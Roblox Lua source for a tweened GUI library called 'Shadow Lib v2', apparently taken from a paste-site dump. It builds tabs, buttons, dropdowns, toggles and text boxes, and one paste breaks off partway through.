	local Connection1 = IntroText.MouseEnter:Connect(function()
		MakeTween(IntroFrame, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.013, 0, 0.013, 0)}):Play()
	end)
	
	local Connection2 = IntroText.MouseLeave:Connect(function()
		MakeTween(IntroFrame, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.0125, 0, 0.0125, 0)}):Play()
	end)
	
	TitleFrame.MouseButton1Down:Wait()
	
	Connection1:Disconnect()
	Connection2:Disconnect()
	
	MakeTween(IntroFrame, TweenInfo.new(0.2, Enum.EasingStyle.Sine), {Size = UDim2.new(0.01, 0, 0.01, 0)}):Play()
	TitleFrame.MouseButton1Up:Wait()
	local Tween = MakeTween(IntroFrame, TweenInfo.new(0.4, Enum.EasingStyle.Bounce), {Size = UDim2.new(0.014, 0, 0.014, 0)})
	Tween:Play()
	Tween.Completed:Wait()
	MakeTween(IntroFrame, TweenInfo.new(1.5, Enum.EasingStyle.Bounce), {Rotation = 180, Position = UDim2.new(0.5, 0, 1.4, 0)}):Play()
	wait(1.5)
	IntroFrame:Destroy()
end

-- Instances --
local MainFrame = Instance.new(""ImageLabel"")
local InfoFrame = Instance.new(""ImageLabel"")
local Icon = Instance.new(""ImageButton"")
local UIAspectRatioConstraint = Instance.new(""UIAspectRatioConstraint"", Icon)
local Title = Instance.new(""TextLabel"")
local ImageLabel = Instance.new(""ImageLabel"")
local TabsControl = Instance.new(""ScrollingFrame"")
local TabsListLayout = Instance.new(""UIListLayout"")
local TabControlTitle = Instance.new(""TextLabel"")
local KeyBind = Instance.new(""Frame"")
local Text = Instance.new(""TextLabel"")
local Bind = Instance.new(""ImageButton"")
local Key = Instance.new(""TextLabel"")

--Properties --
MainFrame.Name = ""MainFrame""
MainFrame.Parent = ShadowLib
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 1.000
MainFrame.Position = UDim2.new(0.5, 0, 1.35, 0)
MainFrame.ClipsDescendants = true
MainFrame.Size = UDim2.new(0.45, 0, 0.55, 0)
MainFrame.Image = ""rbxassetid://3570695787""
MainFrame.ImageColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.ImageTransparency = 0.100
MainFrame.ScaleType = Enum.ScaleType.Slice
MainFrame.SliceCenter = Rect.new(100, 100, 100, 100)
MainFrame.SliceScale = 0.200

InfoFrame.Name = ""InfoFrame""
InfoFrame.Parent = MainFrame
InfoFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfoFrame.BackgroundTransparency = 1.000
InfoFrame.Size = UDim2.new(0.300000012, 0, 1, 0)
InfoFrame.Size = UDim2.new(0, InfoFrame.AbsoluteSize.X, InfoFrame.Size.Y.Scale, 0)
InfoFrame.Image = ""rbxassetid://3570695787""
InfoFrame.ImageColor3 = Color3.fromRGB(25, 25, 25)
InfoFrame.ImageTransparency = 0.100
InfoFrame.ScaleType = Enum.ScaleType.Slice
InfoFrame.SliceCenter = Rect.new(100, 100, 100, 100)
InfoFrame.SliceScale = 0.200

Icon.Name = ""Icon""
Icon.Parent = InfoFrame
Icon.AnchorPoint = Vector2.new(0.5, 0.5)
Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icon.BackgroundTransparency = 1.000
Icon.Position = UDim2.new(0.5, 0, 0.235, 0)
Icon.Size = UDim2.new(0.7, 0, 0.25, 0)
Icon.Image = ""http://www.roblox.com/asset/?id=18146352470""

Title.Name = ""Title""
Title.Parent = InfoFrame
Title.AnchorPoint = Vector2.new(0.5, 0)
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.5, 0, 0.375, 0)
Title.Size = UDim2.new(0.95, 0, 0.1, 0)
Title.Font = Enum.Font.GothamBold
Title.Text = _G.Settings['Name']
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

TabsControl.Name = ""TabsControl""
TabsControl.Parent = InfoFrame
TabsControl.Active = true
TabsControl.AnchorPoint = Vector2.new(0.5, 1)
TabsControl.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TabsControl.BackgroundTransparency = 1.000
TabsControl.BorderSizePixel = 0
TabsControl.Position = UDim2.new(0.5, 0, 0.975, 0)
TabsControl.Size = UDim2.new(1, 0, 0.400000006, 0)
TabsControl.CanvasPosition = Vector2.new(0, 418.880005)
TabsControl.ScrollBarThickness = 5

TabsListLayout.Name = 'TabsListLayout'
TabsListLayout.Parent = TabsControl
TabsListLayout.Padding = UDim.new(0, 5)
TabsListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
TabsListLayout.SortOrder = Enum.SortOrder.LayoutOrder

TabControlTitle.Name = ""Title""
TabControlTitle.Parent = TabsControl
TabControlTitle.Active = true
TabControlTitle.AnchorPoint = Vector2.new(0.5, 0.5)
TabControlTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TabControlTitle.BackgroundTransparency = 1.000
TabControlTitle.Position = UDim2.new(0.5, 0, 0.5, 0)
TabControlTitle.Selectable = true
TabControlTitle.Size = UDim2.new(0.9, 0, 0, 35)
TabControlTitle.Font = Enum.Font.GothamBold
TabControlTitle.Text = ""Tabs""
TabControlTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
TabControlTitle.TextScaled = true
TabControlTitle.TextSize = 14.000
TabControlTitle.TextWrapped = true

KeyBind.Name = ""KeyBind""
KeyBind.Parent = InfoFrame
KeyBind.AnchorPoint = Vector2.new(0.5, 0)
KeyBind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KeyBind.BackgroundTransparency = 1.000
KeyBind.Position = UDim2.new(0.5, 0, 0.48, 0)
KeyBind.Size = UDim2.new(0.75, 0, 0.05, 0)

Text.Name = ""Text""
Text.Parent = KeyBind
Text.AnchorPoint = Vector2.new(0, 0.5)
Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text.BackgroundTransparency = 1.000
Text.Position = UDim2.new(0.325, 0, 0.5, -1)
Text.Size = UDim2.new(0.65, 0, 1, 0)
Text.Font = Enum.Font.GothamSemibold
Text.Text = "" to toggle UI""
Text.TextColor3 = Color3.fromRGB(255, 255, 255)
Text.TextScaled = true
Text.TextSize = 14.000
Text.TextWrapped = true
Text.TextXAlignment = Enum.TextXAlignment.Left

Bind.Name = ""Bind""
Bind.Parent = KeyBind
Bind.Active = false
Bind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bind.BackgroundTransparency = 1.000
Bind.Position = UDim2.new(0.0250000004, 0, 0, 0)
Bind.Selectable = false
Bind.Size = UDim2.new(0.300000012, 0, 1, 0)
Bind.Image = ""rbxassetid://3570695787""
Bind.ImageColor3 = Color3.fromRGB(0, 0, 0)
Bind.ImageTransparency = 0.200
Bind.ScaleType = Enum.ScaleType.Slice
Bind.SliceCenter = Rect.new(100, 100, 100, 100)
Bind.SliceScale = 0.050

Key.Name = ""Key""
Key.Parent = Bind
Key.AnchorPoint = Vector2.new(0.5, 0.5)
Key.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Key.BackgroundTransparency = 1.000
Key.Position = UDim2.new(0.5, 0, 0.5, 0)
Key.Size = UDim2.new(1, 0, 1, 0)
Key.Font = Enum.Font.GothamBlack
Key.Text = _G.Settings['Keybind']
Key.TextColor3 = Color3.fromRGB(255, 255, 255)
Key.TextScaled = true
Key.TextSize = 14.000
Key.TextWrapped = true

-- Scripts --

MakeTween(MainFrame, TweenInfo.new(0.75, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()

-- Toggle
local Cooldown = false

local function Toggle(actionName, inputState, inputObject)
	if inputState == Enum.UserInputState.End or Cooldown == true then
		return
	end
	Cooldown = true
	if MainFrame.Visible == true then
		CurrentTab.Value = false
		local TweenClose = MakeTween(MainFrame, TweenInfo.new(1, Enum.EasingStyle.Sine), {Size = UDim2.new(0, InfoFrame.AbsoluteSize.X, 0.55, 0)})
		TweenClose:Play()
		TweenClose.Completed:Wait()
		wait(0.5)
		local TweenOut = MakeTween(MainFrame, TweenInfo.new(0.75, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 1.35, 0)})
		TweenOut:Play()
		TweenOut.Completed:Wait()
		MainFrame.Visible = false
	else
		MainFrame.Visible = true
		local TweenIn = MakeTween(MainFrame, TweenInfo.new(0.75, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 0.5, 0)})
		TweenIn:Play()
		TweenIn.Completed:Wait()
		wait(0.5)
		local TweenOpen = MakeTween(MainFrame, TweenInfo.new(0.85, Enum.EasingStyle.Sine), {Size = UDim2.new(0.45, 0, 0.55, 0)})
		TweenOpen:Play()
		TweenOpen.Completed:Wait()
		CurrentTab.Value = true
	end
	Cooldown = false
end

CONTEXTACTIONSERVICE:BindAction(""ToggleUI"", Toggle, false, Enum.KeyCode[_G.Settings['Keybind']])

-- Change bind
Bind.MouseButton1Click:Connect(function()
	Bind.Key.Text = '...'
end)

USERINPUTSERVICE.InputBegan:connect(function(input, gameProcessedEvent)
	local KeyName = USERINPUTSERVICE:GetStringForKeyCode(input.KeyCode)
	
	if gameProcessedEvent or Key.Text ~= '...' or KeyName == '' then
		return
	end
	CONTEXTACTIONSERVICE:UnbindAction(""ToggleUI"")
	Key.Text = KeyName
	CONTEXTACTIONSERVICE:BindAction(""ToggleUI"", Toggle, false, input.KeyCode)
end)

-- Expanding tab section
TabsControl.CanvasSize = UDim2.new(0, 0, 0, TabsListLayout.AbsoluteContentSize.Y)
TabsListLayout:GetPropertyChangedSignal(""AbsoluteContentSize""):Connect(function()
	TabsControl.CanvasSize = UDim2.new(0, 0, 0, TabsListLayout.AbsoluteContentSize.Y)
end)

Icon.MouseEnter:Connect(function()
	MakeTween(Icon, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.75, 0, 0.3, 0)}):Play()
end)

Icon.MouseLeave:Connect(function()
	MakeTween(Icon, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.7, 0, 0.25, 0)}):Play()
end)

Icon.MouseButton1Down:Connect(function()
	MakeTween(Icon, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.65, 0, 0.2, 0)}):Play()
	Icon.MouseButton1Up:Wait()
	MakeTween(Icon, TweenInfo.new(0.5, Enum.EasingStyle.Elastic), {Size = UDim2.new(0.75, 0, 0.3, 0)}):Play()
end)

ShadowLib:GetPropertyChangedSignal(""AbsoluteSize""):Connect(function()
	InfoFrame.Size = UDim2.new(0.300000012, 0, 1, 0)
	InfoFrame.Size = UDim2.new(0, InfoFrame.AbsoluteSize.X, InfoFrame.Size.Y.Scale, 0)
end)


function Library:CreateTab(Name)
	local TabLibrary = {}
	
	-- Tab--
	local Tab = Instance.new(""ImageButton"")
	local Title = Instance.new(""TextLabel"")
	local Circle = Instance.new(""ImageLabel"")
	
	Tab.Name = Name
	Tab.Parent = TabsControl
	Tab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Tab.ClipsDescendants = true
	Tab.Size = UDim2.new(0.9, 0, 0, 40)
	Tab.AutoButtonColor = false
	
	Title.Name = ""Title""
	Title.Parent = Tab
	Title.Active = true
	Title.AnchorPoint = Vector2.new(0.5, 0.5)
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.Position = UDim2.new(0.5, 0, 0.5, 0)
	Title.Selectable = true
	Title.Size = UDim2.new(0.800000012, 0, 0.800000012, 0)
	Title.Font = Enum.Font.GothamBold
	Title.Text = Name
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextWrapped = true
	
	-- Frame --
	local TabFrame = Instance.new(""Frame"")
	local UIGridLayout = Instance.new(""UIGridLayout"")
	local Opened = Instance.new('BoolValue')
	
	TabFrame.Name = Name
	TabFrame.Parent = MainFrame
	TabFrame.AnchorPoint = Vector2.new(0, 0.5)
	TabFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TabFrame.BackgroundTransparency = 0.9
	TabFrame.BorderSizePixel = 0
	TabFrame.ClipsDescendants = true
	TabFrame.Position = UDim2.new(0.300000012, 0, 0.5, 0)
	TabFrame.Size = UDim2.new(0.7, 0, 1, 0)
	TabFrame.Visible = false
	
	UIGridLayout.Parent = TabFrame
	UIGridLayout.FillDirection = Enum.FillDirection.Vertical
	UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
	UIGridLayout.CellPadding = UDim2.new(0.025, 0, 0.01, 0)
	UIGridLayout.CellSize = UDim2.new(0.4, 0, 0.1, 0)
	UIGridLayout.FillDirectionMaxCells = 8
	
	Opened.Name = 'Opened'
	Opened.Parent = TabFrame
	Opened.Value = false
	
	-- Scripts --
	Opened:GetPropertyChangedSignal(""Value""):Connect(function()
		if Opened.Value == true then
			MakeTween(Tab, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.92, 0, 0, 50)}):Play()
			Tab.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
		else
			MakeTween(Tab, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.9, 0, 0, 40)}):Play()
			Tab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		end
		TabFrame.Visible = Opened.Value
	end)
	
	Tab.MouseButton1Down:Connect(function(x, y)
		if Cooldown == true then
			return
		end
		for i,v in ipairs(MainFrame:GetChildren()) do
			local OpenedValue = v:FindFirstChild('Opened')
			if OpenedValue and v ~= TabFrame then
				OpenedValue.Value = false
			end
		end
		Opened.Value = true
		CurrentTab = Opened
		Ripple(Tab, x, y)
	end)
	
	if not CurrentTab then
		coroutine.wrap(function()
			CurrentTab = Opened
			wait(0.1)
			Opened.Value = true
		end)()
	end
	
	
	function TabLibrary:Label(LabelText)
		local NewTextLabel = Instance.new(""TextLabel"")
		
		NewTextLabel.Name = ""TEXTLABEL""
		NewTextLabel.Parent = TabFrame
		NewTextLabel.AnchorPoint = Vector2.new(0.5, 1)
		NewTextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		NewTextLabel.BackgroundTransparency = 1.000
		NewTextLabel.Position = UDim2.new(0.5, 0, 1, 0)
		NewTextLabel.Size = UDim2.new(0, 200, 0, 50)
		NewTextLabel.Font = Enum.Font.GothamBlack
		NewTextLabel.Text = LabelText
		NewTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		NewTextLabel.TextScaled = true
		NewTextLabel.TextSize = 14.000
		NewTextLabel.TextWrapped = true
		NewTextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
		
		local LabelLibrary = {}
		function LabelLibrary:Refresh(RefreshText)
			NewTextLabel.Text = RefreshText
		end
		return LabelLibrary
	end
	
	function TabLibrary:Button(Text, Function)
		local Button = Instance.new(""ImageButton"")
		local Title = Instance.new(""TextLabel"")
		
		Button.Name = ""Button""
		Button.Parent = TabFrame
		Button.Active = false
		Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Button.ClipsDescendants = true
		Button.AutoButtonColor = false
		Button.Selectable = false
		Button.Size = UDim2.new(0, 100, 0, 100)
		
		Title.Name = ""Title""
		Title.Parent = Button
		Title.AnchorPoint = Vector2.new(0.5, 0.5)
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0.5, 0, 0.5, 0)
		Title.Size = UDim2.new(0.8, 0, 0.8, 0)
		Title.Text = Text
		Title.Font = Enum.Font.GothamBold
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextWrapped = true
		
		local ClickFunction = Function
		
		Button.MouseButton1Down:Connect(function(x, y)
			coroutine.wrap(ClickFunction)()
			Ripple(Button, x, y)
		end)
		
		local ButtonLibrary = {}
		function ButtonLibrary:Refresh(RefreshText, RefreshFunction)
			Title.Text = RefreshText
			ClickFunction = RefreshFunction
		end
		return ButtonLibrary
	end
	
	function TabLibrary:Dropdown(Placeholder, Contents, Function)
		local Dropdown = Instance.new(""Frame"")
		local Arrow = Instance.new(""ImageButton"")
		local UIAspectRatioConstraint = Instance.new(""UIAspectRatioConstraint"")
		local Output = Instance.new(""TextLabel"")
		local Selection = Instance.new(""ScrollingFrame"")
		local SelectionList = Instance.new(""UIListLayout"")
		
		Dropdown.Name = ""Dropdown""
		Dropdown.Parent = TabFrame
		Dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Dropdown.Size = UDim2.new(0, 100, 0, 100)
		
		Arrow.Name = ""Arrow""
		Arrow.Parent = Dropdown
		Arrow.AnchorPoint = Vector2.new(1, 0.5)
		Arrow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Arrow.BackgroundTransparency = 1.000
		Arrow.Position = UDim2.new(0.980000019, 0, 0.5, 0)
		Arrow.Rotation = 180.000
		Arrow.Size = UDim2.new(0.150000006, 0, 0.449999988, 0)
		Arrow.Image = ""http://www.roblox.com/asset/?id=71659683""
		
		UIAspectRatioConstraint.Parent = Arrow
		
		Output.Name = ""Output""
		Output.Parent = Dropdown
		Output.AnchorPoint = Vector2.new(0, 0.5)
		Output.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Output.BackgroundTransparency = 1.000
		Output.Position = UDim2.new(0, 0, 0.5, 0)
		Output.Size = UDim2.new(0.899999976, 0, 0.800000012, 0)
		Output.Font = Enum.Font.GothamBold
		Output.Text = Placeholder
		Output.TextColor3 = Color3.fromRGB(255, 255, 255)
		Output.TextScaled = true
		Output.TextSize = 14.000
		Output.TextWrapped = true
		
		Selection.Name = ""Selection""
		Selection.Parent = Dropdown
		Selection.Active = true
		Selection.AnchorPoint = Vector2.new(0.5, 0)
		Selection.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Selection.Position = UDim2.new(0.5, 0, 1, 0)
		Selection.Size = UDim2.new(1, 0, 0, 0)
		Selection.Visible = false
		Selection.ZIndex = 2
		Selection.CanvasSize = UDim2.new(0, 0, 4, 0)
		Selection.ScrollBarThickness = 6
		
		SelectionList.Name = ""SelectionList""
		SelectionList.Parent = Selection
		SelectionList.SortOrder = Enum.SortOrder.LayoutOrder
		
		local ChangeFunction = Function
		
		local function CreateContents(List)
			for i,v in ipairs(List) do
				local Option = Instance.new(""TextButton"")
				Option.Name = v
				Option.Parent = Selection
				Option.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Option.BackgroundTransparency = 1.000
				Option.Size = UDim2.new(0.95, 0, 0, 35)
				Option.ZIndex = 3
				Option.Font = Enum.Font.Arial
				Option.Text = v
				Option.TextColor3 = Color3.fromRGB(240, 240, 240)
				Option.TextScaled = true
				Option.TextSize = 14.000
				Option.TextWrapped = true
				Option.MouseButton1Down:Connect(function()
					Output.Text = Option.Text
					coroutine.wrap(ChangeFunction)(Option.Text)
					MakeTween(Arrow, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Rotation = 180}):Play()
					MakeTween(Selection, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(1, 0, 0, 0)}):Play()
					wait(0.5)
					Selection.Visible = false
				end)
			end
		end
		
		CreateContents(Contents)
		
		Arrow.MouseButton1Down:Connect(function(x,y)
			if Selection.Visible == true then
				MakeTween(Arrow, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Rotation = 180}):Play()
				MakeTween(Selection, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(1, 0, 0, 0)}):Play()
				wait(0.5)
				Selection.Visible = false
			else
				Selection.Visible = true
				MakeTween(Arrow, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Rotation = 90}):Play()
				MakeTween(Selection, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(1, 0, 2.5, 0)}):Play()
			end
			
		end)
		
		Selection.CanvasSize = UDim2.new(0, 0, 0, SelectionList.AbsoluteContentSize.Y)
		SelectionList:GetPropertyChangedSignal(""AbsoluteContentSize""):Connect(function()
			Selection.CanvasSize = UDim2.new(0, 0, 0, SelectionList.AbsoluteContentSize.Y)
		end)
		
		local DropDownLibrary = {}
		function DropDownLibrary:Refresh(RefreshPlaceholder, RefreshContents, RefreshFunction)
			Output.Text = RefreshPlaceholder
			for i,v in ipairs(Selection:GetChildren()) do
				if v:IsA('TextButton') then
					v:Destroy()
				end
			end
			CreateContents(RefreshContents)
			ChangeFunction = RefreshFunction
		end
		return DropDownLibrary
	end
	
	function TabLibrary:Toggle(ToggleText, Status, Function)
		local ToggleFrame = Instance.new(""ImageButton"")
		local TextLabel = Instance.new(""TextLabel"")
		local ToggleBox = Instance.new(""ImageLabel"")
		local ToggleRatio = Instance.new(""UIAspectRatioConstraint"")
		
		ToggleFrame.Name = ""Toggle""
		ToggleFrame.Parent = TabFrame
		ToggleFrame.Active = false
		ToggleFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ToggleFrame.BackgroundTransparency = 1.000
		ToggleFrame.Selectable = false
		ToggleFrame.Size = UDim2.new(0, 100, 0, 100)
		
		TextLabel.Parent = ToggleFrame
		TextLabel.AnchorPoint = Vector2.new(0, 0.5)
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.Position = UDim2.new(0, 0, 0.5, 0)
		TextLabel.Size = UDim2.new(0.75, 0, 0.699999988, 0)
		TextLabel.Font = Enum.Font.GothamBlack
		TextLabel.Text = ""TOGGLE""
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextScaled = true
		TextLabel.TextSize = 14.000
		TextLabel.TextWrapped = true
		
		ToggleBox.Name = ""ToggleBox""
		ToggleBox.Parent = ToggleFrame
		ToggleBox.AnchorPoint = Vector2.new(0, 0.5)
		ToggleBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ToggleBox.BackgroundTransparency = 1.000
		ToggleBox.Position = UDim2.new(0.774999976, 0, 0.5, 0)
		ToggleBox.Size = UDim2.new(0.2, 0, 0.6, 0)
		ToggleBox.ClipsDescendants = true
		if Status == true then
			ToggleBox.Image = 'http://www.roblox.com/asset/?id=5228569533'
		else
			ToggleBox.Image = ""http://www.roblox.com/asset/?id=1264513374""
		end
		
		ToggleRatio.Name = ""ToggleRatio""
		ToggleRatio.Parent = ToggleBox
		
		local ToggleSwitch = Status
		
		local ToggleFunction = Function
		
		local function CheckToggle()
			coroutine.wrap(ToggleFunction)(ToggleSwitch)
			if ToggleSwitch == true then
				local Ripple = Instance.new(""ImageLabel"")
				Ripple.Name = ""Circle""
				Ripple.Parent = ToggleBox
				Ripple.BackgroundTransparency = 1
				Ripple.AnchorPoint = Vector2.new(0.5, 0.5)
				Ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
				Ripple.Image = ""rbxassetid://3570695787""
				Ripple.ImageTransparency = 0.8
				Ripple.ScaleType = Enum.ScaleType.Slice
				Ripple.SliceCenter = Rect.new(100, 100, 100, 100)
				local RippleFx = MakeTween(Ripple, TweenInfo.new(0.15), {Size = UDim2.new(1.5, 0, 1.5, 0), ImageTransparency = 0})
				RippleFx:Play()
				RippleFx.Completed:Wait()
				ToggleBox.Image = 'http://www.roblox.com/asset/?id=5228569533'
				Ripple:Destroy()
			else
				ToggleBox.Image = ""http://www.roblox.com/asset/?id=1264513374""
				local Ripple = Instance.new(""ImageLabel"")
				Ripple.Name = ""Circle""
				Ripple.Parent = ToggleBox
				Ripple.BackgroundTransparency = 1
				Ripple.AnchorPoint = Vector2.new(0.5, 0.5)
				Ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
				Ripple.Size = UDim2.new(1.5, 0, 1.5, 0)
				Ripple.Image = ""rbxassetid://3570695787""
				Ripple.ImageTransparency = 0
				Ripple.ScaleType = Enum.ScaleType.Slice
				Ripple.SliceCenter = Rect.new(100, 100, 100, 100)
				local RippleFx = MakeTween(Ripple, TweenInfo.new(0.25), {Size = UDim2.new(0, 0, 0, 0), ImageTransparency = 1})
				RippleFx:Play()
				RippleFx.Completed:Wait()
				Ripple:Destroy()
			end
		end
		
		ToggleFrame.MouseButton1Click:Connect(function()
			ToggleSwitch = not ToggleSwitch
			CheckToggle()
		end)
		
		local ToggleLibrary = {}
		function ToggleLibrary:Refresh(RefreshToggleText, RefreshStatus, RefreshFunction)
			TextLabel.Text = RefreshToggleText
			ToggleSwitch = RefreshStatus
			CheckToggle()
			ToggleFunction = RefreshFunction
		end
	end
	
	function TabLibrary:TextBox(TitleText, Placeholder, Function)
		local TextInput = Instance.new(""Frame"")
		local Title = Instance.new(""TextLabel"")
		local TextBoxFrame = Instance.new(""ImageLabel"")
		local TextBox = Instance.new(""TextBox"")
		
		TextInput.Name = ""TextInput""
		TextInput.Parent = TabFrame
		TextInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextInput.BackgroundTransparency = 1.000
		TextInput.Size = UDim2.new(0, 100, 0, 100)
		
		Title.Name = ""Text""
		Title.Parent = TextInput
		Title.AnchorPoint = Vector2.new(0, 0.5)
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0, 0, 0.5, 0)
		Title.Size = UDim2.new(0.649999976, 0, 0.850000024, 0)
		Title.Font = Enum.Font.GothamBlack
		Title.Text = TitleText
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextWrapped = true
		
		TextBoxFrame.Name = ""TextBoxFrame""
		TextBoxFrame.Parent = TextInput
		TextBoxFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		TextBoxFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextBoxFrame.BackgroundTransparency = 1.000
		TextBoxFrame.Position = UDim2.new(0.824999988, 0, 0.5, 0)
		TextBoxFrame.Size = UDim2.new(0.300000012, 0, 0.5, 0)
		TextBoxFrame.Image = ""rbxassetid://3570695787""
		TextBoxFrame.ImageColor3 = Color3.fromRGB(0, 0, 0)
		TextBoxFrame.ScaleType = Enum.ScaleType.Slice
		TextBoxFrame.SliceCenter = Rect.new(100, 100, 100, 100)
		TextBoxFrame.SliceScale = 0.050
		
		TextBox.Parent = TextBoxFrame
		TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
		TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.BackgroundTransparency = 1.000
		TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
		TextBox.Size = UDim2.new(0.949999988, 0, 0.949999988, 0)
		TextBox.Font = Enum.Font.SourceSans
		TextBox.PlaceholderText = Placeholder
		TextBox.Text = """"
		TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.TextScaled = true
		TextBox.TextSize = 14.000
		TextBox.TextWrapped = true
		
		local FinishedFunction = Function
		
		TextBox.Focused:Connect(function()
			MakeTween(TextBoxFrame, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.325, 0, 0.55, 0)}):Play()
		end)
		
		TextBox.FocusLost:Connect(function()
			coroutine.wrap(FinishedFunction)(TextBox.Text)
			MakeTween(TextBoxFrame, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.3, 0, 0.5, 0)}):Play()
		end)
		
		local TextBoxLibrary = {}
		function TextBoxLibrary:Refresh(RefreshTitleText, RefreshPlaceholder, RefreshFunction)
			Title.Text = RefreshTitleText
			TextBox.PlaceholderText = RefreshPlaceholder
			FinishedFunction = RefreshFunction
		end
		return TextBoxLibrary
	end
	
	
	return TabLibrary
end

return Library"
SCcBdcur,Etronix-Library,besteryoutube,Lua,Friday 21st of June 2024 10:04:06 AM CDT,"--[[
 ____ _  _  __  ____  __  _  _    __   __ ____    _  _ ____ 
/ ___) )( \/ _\(    \/  \/ )( \  (  ) (  |  _ \  / )( (___ \
\___ ) __ (    \) D (  O ) /\ /  / (_/\)( ) _ (  \ \/ // __/
(____|_)(_|_/\_(____/\__/(_/\_)  \____(__|____/   \__/(____)

]]--

local Library = {}

-- DEFINING GLOBALS --
if not _G.Settings then
	_G.Settings = {
		['Name'] = 'Shadow Lib v2',
		['Intro'] = false,
		['Keybind'] = 'G'
	}
end


-- Constants --
local PLAYERSERVICE = game:GetService('Players')
local TWEENSERVICE = game:GetService('TweenService')
local CONTEXTACTIONSERVICE = game:GetService('ContextActionService')
local USERINPUTSERVICE = game:GetService('UserInputService')

local LOCALPLAYER = PLAYERSERVICE.LocalPlayer

-- Variables --
local CurrentTab = nil


-- Functions --
local function MakeTween(Item, Info, Goal)
	return TWEENSERVICE:Create(Item, Info, Goal)
end

local function Ripple(Button, x, y)
	local Ripple = Instance.new(""ImageLabel"")
	Ripple.Name = ""Circle""
	Ripple.Parent = Button
	Ripple.BackgroundTransparency = 1
	Ripple.AnchorPoint = Vector2.new(0.5, 0.5)
	Ripple.Position = UDim2.new(0,x - Button.AbsolutePosition.X, 0, y - Button.AbsolutePosition.Y - 36)
	Ripple.Image = ""rbxassetid://3570695787""
	Ripple.ScaleType = Enum.ScaleType.Slice
	Ripple.SliceCenter = Rect.new(100, 100, 100, 100)
	local RippleFx = MakeTween(Ripple, TweenInfo.new(0.5), {Size = UDim2.new(0, 300, 0, 300), ImageTransparency = 0.95})
	RippleFx:Play()
